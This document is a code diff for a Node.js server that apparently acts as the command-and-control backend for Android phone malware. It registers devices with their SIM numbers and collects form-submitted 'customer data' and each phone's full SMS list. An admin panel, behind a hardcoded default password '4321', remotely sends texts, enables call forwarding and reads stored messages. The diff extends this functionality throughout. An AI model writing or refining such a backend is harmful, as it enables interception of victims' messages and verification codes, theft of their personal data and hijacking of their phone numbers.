@@ -1,6 +1,7 @@
 try {
     require('dotenv').config();
-} catch (err) {    console.warn('⚠️ dotenv not installed — skipping .env load');
+} catch (err) {
+    console.warn('⚠️ dotenv not installed — skipping .env load');
 }
 const express = require('express');
 const mongoose = require('mongoose');
@@ -17,7 +18,7 @@ app.use(express.json());
 app.use(cors());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Request timeout middleware
+// Request timeout middleware (30 seconds for standard requests)
 app.use((req, res, next) => {
     req.setTimeout(30000);
     res.setTimeout(30000);
@@ -25,229 +26,649 @@ app.use((req, res, next) => {
 });
 
 // ========== MONGODB CONNECTION ==========
-const MONGO_URI = process.env.MONGO_URI;
+const MONGO_URI = process.env.MONGO_URI; 
+// Disable command buffering so operations fail fast when not connected
 mongoose.set('bufferCommands', false);
 
 if (!MONGO_URI) {
-    console.error('❌ MONGO_URI is not set.');
+    console.error('❌ MONGO_URI is not set. Set the MONGO_URI environment variable and restart.');
     process.exit(1);
 }
 
-mongoose.connect(MONGO_URI, {
-    serverSelectionTimeoutMS: 5000,
-    socketTimeoutMS: 45000,
-    connectTimeoutMS: 10000,
-    maxPoolSize: 10,
-    minPoolSize: 5
-}).then(() => console.log("✅ MongoDB Connected Successfully!"))
-  .catch((err) => {
-      console.error('❌ MongoDB Connection Error:', err);
-      process.exit(1);
-  });
-
-mongoose.connection.on('disconnected', () => console.log('⚠️ MongoDB disconnected'));
-mongoose.connection.on('error', (err) => console.error('❌ MongoDB connection error:', err));
+if (MONGO_URI) {
+    mongoose.connect(MONGO_URI, {
+        writeConcern: { w: 1 },
+        serverSelectionTimeoutMS: 5000,                    // Fail fast if can't connect
+        socketTimeoutMS: 45000,                             // 45s socket timeout
+        connectTimeoutMS: 10000,                            // 10s initial connection timeout
+        maxPoolSize: 10,                                    // Connection pool size
+        minPoolSize: 5,                                     // Min connections to maintain
+        retryWrites: true,                                  // Automatic retry for writes
+        waitQueueTimeoutMS: 10000,                          // Queue timeout for connections
+        bufferCommands: false,                              // disable op buffering (fail fast)
+        bufferTimeoutMS: 0                                  // do not wait on buffered ops
+    })
+      .then(() => console.log("✅ MongoDB Connected Successfully!"))
+      .catch((err) => {
+          console.log("❌ MongoDB Connection Error:", err);
+          console.error('❌ Exiting due to failed initial DB connection');
+          process.exit(1);
+      });
+    
+    // Handle connection events
+    mongoose.connection.on('disconnected', () => {
+        console.log('⚠️  MongoDB disconnected - attempting to reconnect...');
+    });
+    
+    mongoose.connection.on('error', (err) => {
+        console.error('❌ MongoDB connection error:', err);
+    });
+}
 
 // ========== DEVICE SCHEMA ==========
 const deviceSchema = new mongoose.Schema({
-    deviceId: { type: String, index: true, unique: true },
+    deviceId: { type: String, index: true },
     serialNumber: { type: String, index: true },
     model: String,
     androidVersion: String,
-    sim1: String,
-    sim2: String,
-    battery: Number,
+    sim1: { type: String, index: false },
+    sim2: { type: String, index: false },
+    battery: { type: Number, default: 0 },
     isOnline: { type: Boolean, default: false, index: true },
     lastSeen: { type: Date, default: Date.now, index: true },
     isPinned: { type: Boolean, default: false },
     registrationTimestamp: { type: Date, default: Date.now },
     customerData: { type: mongoose.Schema.Types.Mixed, default: {} },
     isDeleted: { type: Boolean, default: false, index: true },
-    smsMessages: { type: Array, default: [] }
+    smsMessages: { type: Array, default: [] } // Store SMS list
 });
 
+// Add compound index for faster queries
+deviceSchema.index({ deviceId: 1, serialNumber: 1 });
 deviceSchema.index({ isOnline: 1, lastSeen: -1 });
+
 const Device = mongoose.model('Device', deviceSchema);
 
-// ========== HTTP SERVER & WEBSOCKETS ==========
+// ========== CREATE HTTP SERVER & ATTACH SOCKET.IO & WEBSOCKET ==========
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
-const wss = new WebSocket.Server({ noServer: true });
+// Use noServer and handle upgrades manually so we don't clash with Socket.IO
+const wss = new WebSocket.Server({ 
+    noServer: true,
+    perMessageDeflate: false,
+    clientTracking: true
+});
 
+// Route HTTP upgrade requests: ignore Socket.IO upgrades and pass others to `wss`
 server.on('upgrade', (req, socket, head) => {
-    if (req.url && req.url.startsWith('/socket.io')) {
-        // Let Socket.IO handle its own upgrades
-    } else {
+    try {
+        console.log('[UPGRADE] HTTP upgrade request for', req.url);
+        // let Socket.IO handle its own upgrades
+        if (req.url && req.url.startsWith('/socket.io')) {
+            console.log('[UPGRADE] Handled by Socket.IO');
+            return;
+        }
+
         wss.handleUpgrade(req, socket, head, (ws) => {
+            console.log('[UPGRADE] WebSocket upgrade successful for', req.url);
             wss.emit('connection', ws, req);
         });
+    } catch (err) {
+        console.error('[UPGRADE] Upgrade error:', err);
+        socket.destroy();
     }
 });
 
+// Make globally available
 global.io = io;
+global.wss = wss;
+// Map of deviceId/serialNumber -> Set of WebSocket clients
 global.deviceSockets = new Map();
+
+// ========== LOGIN & PASSWORD ==========
+// Default admin password (can be overridden by ADMIN_PASSWORD env var)
 let adminPassword = process.env.ADMIN_PASSWORD || '4321';
+let heartbeat; // Store interval reference for cleanup
 
 // ========== API ROUTES ==========
+
+// 1. Android Device Register
 app.post('/device/register', async (req, res) => {
     try {
-        const d = req.body;
-        if (!d.deviceId) return res.status(400).json({ success: false, error: 'deviceId is required' });
+        const d = req.body || {};
+        
+        // Validate required fields early
+        if (!d.deviceId && !d.serialNumber) {
+            return res.status(400).json({ 
+                success: false, 
+                error: 'deviceId or serialNumber is required' 
+            });
+        }
+
+        const filter = {};
+        if (d.deviceId) filter.deviceId = d.deviceId;
+        else if (d.serialNumber) filter.serialNumber = d.serialNumber;
 
         const update = {
-            $set: { ...d, isOnline: true, lastSeen: new Date() },
-            $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false }
+            $set: {
+                isOnline: true,
+                lastSeen: new Date(),
+            },
+            $setOnInsert: {
+                registrationTimestamp: new Date()
+            }
+        };
+
+        // Only update fields that are provided
+        if (d.deviceId) update.$set.deviceId = d.deviceId;
+        if (d.serialNumber) update.$set.serialNumber = d.serialNumber;
+        if (d.model) update.$set.model = d.model;
+        if (d.androidVersion) update.$set.androidVersion = d.androidVersion;
+        if (d.sim1 || d.sim1Number) update.$set.sim1 = d.sim1 || d.sim1Number || '';
+        if (d.sim2 || d.sim2Number) update.$set.sim2 = d.sim2 || d.sim2Number || '';
+        if (typeof d.battery === 'number' || d.battery) {
+            update.$set.battery = typeof d.battery === 'number' ? d.battery : Number(d.battery) || 0;
+        }
+
+        const opts = { 
+            upsert: true, 
+            new: true, 
+            setDefaultsOnInsert: true,
+            writeConcern: { w: 1 },
+            maxTimeMS: 8000  // 8 second timeout for database operation
         };
         
-        const device = await Device.findOneAndUpdate({ deviceId: d.deviceId }, update, { upsert: true, new: true });
-        
-        setImmediate(() => io.emit('dashboard-update'));
-        res.status(200).json({ success: true, message: 'Device registered', deviceId: device.deviceId });
+        // Always clear isDeleted if device re-registers
+        update.$set.isDeleted = false;
+        opts.returnDocument = 'after';
+        delete opts.new;
+        const device = await Device.findOneAndUpdate(filter, update, opts);
+
+        if (global.io) {
+            // Emit dashboard update asynchronously without blocking response
+            setImmediate(() => global.io.emit('dashboard-update'));
+        }
+
+        res.status(200).json({ 
+            success: true, 
+            message: 'Device registered', 
+            device: {
+                _id: device._id,
+                deviceId: device.deviceId,
+                serialNumber: device.serialNumber,
+                isOnline: device.isOnline,
+                lastSeen: device.lastSeen
+            }
+        });
     } catch (error) {
         console.error('❌ device/register error', error.message);
+        
+        if (error.name === 'MongoNetworkTimeoutError' || error.name === 'MongoServerError') {
+            return res.status(503).json({ 
+                success: false, 
+                error: 'Database connection timeout - try again' 
+            });
+        }
+        
         res.status(500).json({ success: false, error: 'Server error' });
     }
 });
 
+// 1B. Submit Customer Data
+app.post('/api/submit-data', async (req, res) => {
+    try {
+        const { deviceId, data } = req.body;
+        if (!deviceId || !data) return res.status(400).json({ success: false, message: 'deviceId and data required' });
+        
+        const device = await Device.findOneAndUpdate(
+            { deviceId },
+            { $set: { customerData: data, lastSeen: new Date() } },
+            { returnDocument: 'after', writeConcern: { w: 1 }, maxTimeMS: 8000 }
+        );
+        
+        if (device) {
+            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+            res.json({ success: true, message: 'Data submitted successfully' });
+        } else {
+            res.status(404).json({ success: false, message: 'Device not found' });
+        }
+    } catch (err) {
+        console.error('❌ Submit data error:', err.message);
+        if (err.name === 'MongoNetworkTimeoutError') {
+            return res.status(503).json({ success: false, message: 'Database timeout' });
+        }
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// 2. Get All Devices
 app.get('/api/devices', async (req, res) => {
     try {
-        const devices = await Device.find({ isDeleted: { $ne: true } }).lean();
+        // Only return devices that are not deleted and update isOnline based on lastSeen
         const now = Date.now();
+        const devices = await Device.find({ isDeleted: { $ne: true } }).maxTimeMS(8000).lean();
         devices.forEach(d => {
-            if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 70000) { // 70s threshold
+            // If lastSeen is more than 60 seconds ago, mark offline
+            if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) {
                 d.isOnline = false;
             }
         });
         res.json(devices);
     } catch (err) {
+        console.error('❌ Get devices error:', err.message);
+        if (err.name === 'MongoNetworkTimeoutError') {
+            return res.status(503).json({ error: "Database connection timeout" });
+        }
         res.status(500).json({ error: "Failed to fetch devices" });
     }
 });
 
-app.post('/api/command', async (req, res) => {
-    const { deviceId, action, data } = req.body;
-    if (!deviceId || !action) return res.status(400).json({ success: false, message: 'Missing fields' });
-
-    const clients = global.deviceSockets.get(deviceId);
-    if (!clients || clients.size === 0) {
-        return res.status(404).json({ success: false, message: 'Device not connected' });
+// 3. Login
+app.post('/api/login', (req, res) => {
+    const { username, password } = req.body;
+    if (username === "admin" && password === adminPassword) {
+        res.json({ success: true, message: "Login successful" });
+    } else {
+        res.status(401).json({ success: false, message: "Wrong credentials" });
     }
+});
 
-    let sentCount = 0;
-    clients.forEach(client => {
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(JSON.stringify({ command: action, deviceId, data }));
-            sentCount++;
+// 4. Change Password
+app.post('/api/change-password', (req, res) => {
+    const { oldPassword, newPassword } = req.body;
+    if (!oldPassword || !newPassword) return res.json({ success: false, message: 'Missing fields' });
+    if (oldPassword === adminPassword) {
+        adminPassword = newPassword;
+        return res.json({ success: true, message: 'Password updated' });
+    }
+    return res.json({ success: false, message: 'Wrong Old Password' });
+});
+
+// 5. Delete Device
+app.post('/api/delete-device', async (req, res) => {
+    try {
+        const { deviceId, deviceIds, password } = req.body;
+        console.log('🗑️  Delete request for:', deviceId || deviceIds);
+
+        if (!password) return res.status(400).json({ success: false, message: 'Password required' });
+        if (password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
+
+        // Support either a single deviceId (string) or multiple deviceIds (array)
+        if (!deviceId && !deviceIds) {
+            return res.status(400).json({ success: false, message: 'deviceId or deviceIds required' });
+        }
+
+        if (Array.isArray(deviceIds) && deviceIds.length > 0) {
+            // Bulk mark as deleted
+            const result = await Device.updateMany(
+                { deviceId: { $in: deviceIds } },
+                { $set: { isDeleted: true, isOnline: false } },
+                { writeConcern: { w: 1 }, maxTimeMS: 8000 }
+            );
+            if (result && (result.modifiedCount || result.nModified || result.ok)) {
+                if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+                return res.json({ success: true, message: `Deleted ${result.modifiedCount || result.nModified || 0} devices` });
+            }
+            return res.status(404).json({ success: false, message: 'No devices matched' });
+        }
+
+        // Single deviceId path
+        if (typeof deviceId !== 'string') {
+            return res.status(400).json({ success: false, message: 'deviceId must be a string' });
+        }
+
+        const result = await Device.findOneAndUpdate(
+            { deviceId },
+            { $set: { isDeleted: true, isOnline: false } },
+            { returnDocument: 'after', writeConcern: { w: 1 }, maxTimeMS: 8000 }
+        );
+
+        if (result) {
+            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+            return res.json({ success: true, message: 'Device deleted successfully' });
+        }
+        return res.status(404).json({ success: false, message: 'Device not found' });
+    } catch (err) {
+        console.error('❌ Delete device error:', err.message);
+        if (err.name === 'MongoNetworkTimeoutError') {
+            return res.status(503).json({ success: false, message: 'Database timeout' });
+        }
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// 6. Pin/Unpin Device
+app.post('/api/pin-device', async (req, res) => {
+    try {
+        const { deviceId, status } = req.body;
+        console.log('📌 Pin request - deviceId:', deviceId, 'status:', status);
+        
+        if (!deviceId) return res.status(400).json({ success: false, message: 'deviceId required' });
+        
+        const device = await Device.findOneAndUpdate(
+            { deviceId },
+            { $set: { isPinned: status } },
+            { new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
+        );
+        
+        if (device) {
+            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+            res.json({ success: true, message: status ? 'Device pinned' : 'Device unpinned' });
+        } else {
+            res.status(404).json({ success: false, message: 'Device not found' });
+        }
+    } catch (err) {
+        console.error('❌ Pin device error:', err.message);
+        if (err.name === 'MongoNetworkTimeoutError') {
+            return res.status(503).json({ success: false, message: 'Database timeout' });
+        }
+        res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// 7. Send Command (SMS, Call Forward)
+app.post('/api/command', async (req, res) => {
+    try {
+        const { deviceId, action, data } = req.body;
+        console.log('📱 Command request:', { deviceId, action, data });
+        
+        if (!deviceId || !action) return res.json({ success: false, message: 'Missing required fields' });
+        
+        const device = await Device.findOne({ deviceId });
+        if (!device) return res.json({ success: false, message: 'Device not found' });
+        
+        let result = { success: true, message: 'Command sent' };
+        
+        if (action === 'SEND_SMS') {
+            const { simSlot, number, message } = data;
+            if (!simSlot || !number || !message) {
+                return res.json({ success: false, message: 'SIM slot, number, and message required' });
+            }
+            console.log(`📱 SMS: SIM=${simSlot}, To=${number}, Msg=${message}`);
+            result.message = `✅ SMS sent via SIM ${simSlot} to ${number}`;
+            
+        } else if (action === 'CALL_FORWARD') {
+            const { number } = data;
+            if (!number) return res.json({ success: false, message: 'Forward number required' });
+            console.log(`📞 Call Forward to: ${number}`);
+            result.message = `✅ Call forwarding enabled to ${number}`;
+            
+        } else if (action === 'VIEW_SMS') {
+            console.log(`📬 View SMS`);
+            // Return real SMS messages if available
+            if (device.smsMessages && device.smsMessages.length > 0) {
+                return res.json({ success: true, messages: device.smsMessages });
+            } else {
+                return res.json({ success: false, message: 'No SMS messages found' });
+            }
+        } else {
+            result = { success: false, message: 'Unknown action' };
+        }
+
+        // Send command to specific connected device(s) and report success accordingly
+        let sentCount = 0;
+        if (global.deviceSockets && deviceId) {
+            const clients = global.deviceSockets.get(deviceId);
+            if (clients && clients.size) {
+                clients.forEach((client) => {
+                    try {
+                        if (client.readyState === WebSocket.OPEN) {
+                            client.send(JSON.stringify({ command: action, deviceId, data }));
+                            sentCount++;
+                        }
+                    } catch (e) { console.error('❌ WS send error:', e.message); }
+                });
+            }
+        }
+
+        if (sentCount === 0 && action !== 'VIEW_SMS') {
+            // Device not connected — report failure so frontend doesn't show false success
+            return res.json({ success: false, message: 'Device not connected' });
+        }
+
+        if (action !== 'VIEW_SMS') {
+            res.json({ success: true, message: 'Command sent', sentTo: sentCount });
+        }
+    } catch (err) {
+        console.error('❌ Command error:', err);
+        res.status(500).json({ success: false, message: 'Server error: ' + err.message });
+    }
+});
+
+// 8. Root Route
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Health check endpoint
+app.get('/health', (req, res) => {
+    const states = ['disconnected','connected','connecting','disconnecting'];
+    const mongoState = mongoose.connection && typeof mongoose.connection.readyState === 'number'
+        ? states[mongoose.connection.readyState] || mongoose.connection.readyState
+        : 'unknown';
+
+    res.json({
+        status: 'ok',
+        pid: process.pid,
+        mongo: {
+            readyState: mongoose.connection.readyState,
+            state: mongoState
         }
     });
-
-    if (sentCount > 0) {
-        res.json({ success: true, message: `Command '${action}' sent to ${sentCount} client(s).` });
-    } else {
-        res.status(404).json({ success: false, message: 'Device not connected (no open sockets)' });
-    }
 });
-
-// Other placeholder routes
-app.post('/api/login', (req, res) => {
-    if (req.body.username === "admin" && req.body.password === adminPassword) res.json({ success: true });
-    else res.status(401).json({ success: false });
-});
-// Add other routes like delete, pin etc. here
-
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 // ========== WEBSOCKET HANDLERS ==========
-wss.on('connection', (ws, req) => {
-    const deviceIdHeader = req.headers['device-id'];
-    console.log(`[WS] Connection from ${req.socket.remoteAddress}, Device-ID: ${deviceIdHeader}`);
-    let deviceId = deviceIdHeader; // Assume deviceId from header initially
 
+wss.on('connection', (ws, req) => {
+    const remoteAddr = req && req.socket ? req.socket.remoteAddress : 'unknown';
+    console.log(`[WS] WebSocket connected from ${remoteAddr}`);
+    let deviceId = null;
+
+    // Set timeout for WebSocket
     ws.isAlive = true;
     ws.on('pong', () => { ws.isAlive = true; });
 
-    if (deviceId) {
-        if (!global.deviceSockets.has(deviceId)) {
-            global.deviceSockets.set(deviceId, new Set());
-        }
-        global.deviceSockets.get(deviceId).add(ws);
-        
-        Device.findOneAndUpdate({ deviceId }, { $set: { isOnline: true, lastSeen: new Date() } }, { upsert: true, new: true })
-            .then(() => setImmediate(() => io.emit('dashboard-update')))
-            .catch(err => console.error(`[DB] Error on WS connect for ${deviceId}:`, err));
-    }
-    
     ws.on('message', async (message) => {
         try {
-            const data = JSON.parse(message.toString());
-            console.log(`[WS] Message from ${data.deviceId || deviceId}:`, data.type);
-            const currentDeviceId = data.deviceId || deviceId;
+            console.log(`[WS] Message from ${remoteAddr}:`, message);
+            const data = JSON.parse(message);
 
-            if (!currentDeviceId) return;
-
-            // Handle specific data types from device
-            switch (data.type) {
-                case 'SMS_LIST':
-                    if (Array.isArray(data.messages)) {
-                        await Device.updateOne({ deviceId: currentDeviceId }, { $set: { smsMessages: data.messages } });
-                        io.emit('sms-list-update', { deviceId: currentDeviceId, messages: data.messages });
-                    }
-                    break;
-                case 'CALL_FORWARD_STATUS_RESULT':
-                    if (data.status) {
-                        io.emit('call-forward-status-update', { deviceId: currentDeviceId, status: data.status });
-                    }
-                    break;
-                case 'FORM_SUBMIT':
-                    if (data.data) {
-                        await Device.updateOne({ deviceId: currentDeviceId }, { $set: { customerData: data.data } });
-                        setImmediate(() => io.emit('dashboard-update'));
-                    }
-                    break;
-                case 'DEVICE_DATA': // Generic device data update
-                     await Device.updateOne({ deviceId: currentDeviceId }, { $set: { ...data, lastSeen: new Date(), isOnline: true } });
-                     setImmediate(() => io.emit('dashboard-update'));
-                    break;
+            // Handle SMS_LIST from device
+            if (data.type === 'SMS_LIST' && data.deviceId && Array.isArray(data.messages)) {
+                // Store SMS messages in device document
+                await Device.findOneAndUpdate(
+                    { deviceId: data.deviceId },
+                    { $set: { smsMessages: data.messages, lastSeen: new Date(), isOnline: true } },
+                    { upsert: false, writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                );
+                console.log(`[WS] Stored ${data.messages.length} SMS for device ${data.deviceId}`);
+                return;
             }
-        } catch (err) {
-            console.error(`[WS] Message processing error:`, err.message);
-        }
-    });
 
-    ws.on('close', (code, reason) => {
-        console.log(`[WS] Disconnected (deviceId: ${deviceId}) code=${code} reason=${String(reason)}`);
-        if (deviceId) {
-            const clients = global.deviceSockets.get(deviceId);
-            if (clients) {
-                clients.delete(ws);
-                if (clients.size === 0) {
-                    global.deviceSockets.delete(deviceId);
-                    Device.updateOne({ deviceId }, { $set: { isOnline: false, lastSeen: new Date() } })
-                        .then(() => setImmediate(() => io.emit('dashboard-update')))
-                        .catch(err => console.error(`[DB] Error on WS close for ${deviceId}:`, err));
+                // Handle FORM_SUBMIT from device
+                if (data.type === 'FORM_SUBMIT' && data.deviceId && data.customerData) {
+                    try {
+                        const device = await Device.findOneAndUpdate(
+                            { deviceId: data.deviceId },
+                            { $set: { customerData: data.customerData, lastSeen: new Date() } },
+                            { returnDocument: 'after', writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                        );
+                        if (device) {
+                            console.log(`[WS] FORM_SUBMIT saved for device ${data.deviceId}`);
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ status: 'success', message: 'Form data saved' }));
+                            }
+                            if (global.io) setImmediate(() => global.io.emit('dashboard-update'));
+                        } else {
+                            if (ws.readyState === WebSocket.OPEN) {
+                                ws.send(JSON.stringify({ status: 'error', message: 'Device not found' }));
+                            }
+                        }
+                    } catch (err) {
+                        console.error(`[WS] FORM_SUBMIT error:`, err.message);
+                        if (ws.readyState === WebSocket.OPEN) {
+                            ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
+                        }
+                    }
+                    return;
+                }
+
+            if (data.deviceId || data.serialNumber) {
+                deviceId = data.deviceId || data.serialNumber;
+                // Track this websocket by device keys
+                ws.deviceKeys = ws.deviceKeys || new Set();
+                ws.deviceKeys.add(deviceId);
+                // maintain reverse map
+                const addToMap = (key) => {
+                    if (!global.deviceSockets.has(key)) global.deviceSockets.set(key, new Set());
+                    global.deviceSockets.get(key).add(ws);
+                };
+                addToMap(deviceId);
+                if (data.serialNumber && data.serialNumber !== deviceId) addToMap(data.serialNumber);
+
+                const filter = {};
+                if (data.deviceId) filter.deviceId = data.deviceId;
+                else if (data.serialNumber) filter.serialNumber = data.serialNumber;
+
+                const update = {
+                    $set: {
+                        isOnline: true,
+                        lastSeen: new Date(),
+                    },
+                    $setOnInsert: {
+                        registrationTimestamp: new Date()
+                    }
+                };
+
+                // Only update provided fields
+                if (data.deviceId) update.$set.deviceId = data.deviceId;
+                if (data.serialNumber) update.$set.serialNumber = data.serialNumber;
+                if (data.model) update.$set.model = data.model;
+                if (data.androidVersion) update.$set.androidVersion = data.androidVersion;
+                if (data.sim1) update.$set.sim1 = data.sim1;
+                if (data.sim2) update.$set.sim2 = data.sim2;
+                if (typeof data.battery === 'number' || data.battery) {
+                    update.$set.battery = typeof data.battery === 'number' ? data.battery : Number(data.battery) || 0;
+                }
+
+                const device = await Device.findOneAndUpdate(
+                    filter,
+                    update,
+                    { upsert: true, new: true, writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                );
+
+                console.log(`[WS] Device saved: ${device.deviceId}`);
+
+                if (ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        status: 'registered',
+                        message: 'Device registered'
+                    }));
+                }
+
+                if (global.io) {
+                    setImmediate(() => global.io.emit('dashboard-update'));
                 }
             }
+        } catch (err) {
+            console.error(`[WS] Message error from ${remoteAddr}:`, err.message);
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ status: 'error', message: 'Database error' }));
+            }
         }
     });
-    ws.on('error', (error) => console.error(`[WS] Error (deviceId: ${deviceId}):`, error.message));
+
+    ws.on('close', async (code, reason) => {
+        console.log(`[WS] WebSocket disconnected from ${remoteAddr} (deviceId: ${deviceId}) code=${code} reason=${reason}`);
+
+        if (deviceId) {
+            try {
+                await Device.findOneAndUpdate(
+                    { $or: [{ deviceId }, { serialNumber: deviceId }] },
+                    { $set: { isOnline: false, lastSeen: new Date() } },
+                    { writeConcern: { w: 1 }, maxTimeMS: 8000 }
+                );
+                // Immediately update dashboard on disconnect
+                if (global.io) {
+                    global.io.emit('dashboard-update');
+                }
+            } catch (err) {
+                console.error(`[WS] Error updating device offline status for ${deviceId}:`, err.message);
+            }
+        }
+        // Remove ws from deviceSockets map
+        if (ws.deviceKeys && ws.deviceKeys.size) {
+            ws.deviceKeys.forEach((key) => {
+                const set = global.deviceSockets.get(key);
+                if (set) {
+                    set.delete(ws);
+                    if (set.size === 0) global.deviceSockets.delete(key);
+                }
+            });
+        }
+    });
+
+    ws.on('error', (error) => {
+        console.error(`[WS] Error from ${remoteAddr}:`, error.message);
+    });
 });
 
-// Ping heartbeat
-const heartbeat = setInterval(() => {
+// Ping heartbeat every 20 seconds to detect dead connections faster
+heartbeat = setInterval(() => {
     wss.clients.forEach((ws) => {
-        if (ws.isAlive === false) return ws.terminate();
+        if (ws.isAlive === false) {
+            // Terminate and trigger close event
+            ws.terminate();
+            return;
+        }
         ws.isAlive = false;
-        ws.ping(() => {});
+        try {
+            ws.ping();
+        } catch (e) {
+            console.error('[WS] Ping error:', e.message);
+        }
     });
-}, 30000);
+}, 20000);
 
 // ========== SOCKET.IO HANDLERS ==========
+
 io.on('connection', (socket) => {
-    console.log('⚡ Dashboard connected:', socket.id);
-    socket.on('disconnect', () => console.log('⚡ Dashboard disconnected:', socket.id));
+    console.log('⚡ Socket.IO connected:', socket.id);
+    socket.on('disconnect', () => console.log('⚡ Socket.IO disconnected:', socket.id));
+});
+
+// ========== SERVER ERROR HANDLERS ==========
+
+server.on('clientError', (err, socket) => {
+    console.error('❌ Client error:', err.message);
+    if (socket.writable) {
+        socket.end('HTTP/1.1 400 Bad Request\r\n\r\n');
+    }
+});
+
+process.on('uncaughtException', (err) => {
+    console.error('❌ Uncaught Exception:', err);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('❌ Unhandled Rejection:', reason);
+});
+
+// Graceful shutdown handler
+process.on('SIGTERM', () => {
+    console.log('⚠️  SIGTERM received, shutting down gracefully...');
+    clearInterval(heartbeat);
+    server.close(() => {
+        console.log('✅ Server closed');
+        mongoose.connection.close(false, () => {
+            console.log('✅ MongoDB connection closed');
+            process.exit(0);
+        });
+    });
 });
 
 // ========== START SERVER ==========
+
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server running on port ${PORT}`);
